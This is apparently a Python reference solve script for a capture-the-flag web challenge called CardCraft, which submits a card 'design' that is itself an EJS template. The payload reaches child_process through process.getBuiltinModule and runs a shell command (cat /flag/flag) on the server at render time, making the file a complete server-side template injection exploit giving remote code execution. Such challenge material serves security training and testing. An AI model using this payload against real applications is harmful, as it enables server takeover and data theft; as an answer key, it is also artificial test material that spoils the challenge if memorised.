#!/usr/bin/env python3
"""Reference solve for inj6 (CardCraft).

The "card design" is rendered with ejs.render as a TEMPLATE. Supply a
design that is itself EJS code and read the flag at render time. EJS 3
templates see the JS globals but not the module `require`, so the
builtin module is pulled via process.getBuiltinModule (Node >= 20.16):

    design = "<%= process.getBuiltinModule('child_process').execSync('cat /flag/flag').toString() %>"
"""
import os
import re
import sys
import time
import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get(
    "BASE", "http://127.0.0.1:8045")
FLAG_RE = re.compile(r"flag\{[^}]+\}")
DESIGN = ("<%= process.getBuiltinModule('child_process')"
          ".execSync('cat /flag/flag').toString() %>")


def main() -> int:
    for _ in range(30):
        try:
            requests.get(BASE, timeout=3)
            break
        except requests.RequestException:
            time.sleep(1)
    try:
        r = requests.post(
            BASE + "/card",
            data={"recipient": "x", "message": "y", "design": DESIGN},
            timeout=15)
    except requests.RequestException as e:
        sys.stderr.write(f"unreachable: {e}\n")
        return 1
    m = FLAG_RE.search(r.text)
    if m:
        print(m.group(0))
        return 0
    sys.stderr.write(f"no flag found (HTTP {r.status_code})\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
